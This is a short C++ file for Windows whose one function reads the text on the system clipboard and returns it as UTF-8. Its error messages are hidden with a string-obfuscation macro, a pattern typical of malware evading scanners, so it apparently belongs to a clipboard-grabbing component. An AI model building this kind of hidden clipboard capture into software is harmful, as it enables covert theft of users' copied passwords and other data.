#include <string>
#include <windows.h>
#include <tools.h>
#include <obfstr.h>

// Extracting in UTF_16 format, Windows console could not show it properly
std::string GetClipboardText()
{
    if(!OpenClipboard(nullptr))
    {
        return OBFSTR("Failed. Clipboard is not open.");
    }

    HANDLE hData = GetClipboardData(CF_UNICODETEXT);

    wchar_t* textArray = static_cast<wchar_t*>(GlobalLock(hData));
    if(textArray == nullptr)
    {
        CloseClipboard();
        return OBFSTR("Failed. Cannot lock clipboard memory location.");
    }

    std::wstring text(textArray);

    GlobalUnlock(hData);
    CloseClipboard();

    return WStringToUtf8(text);
}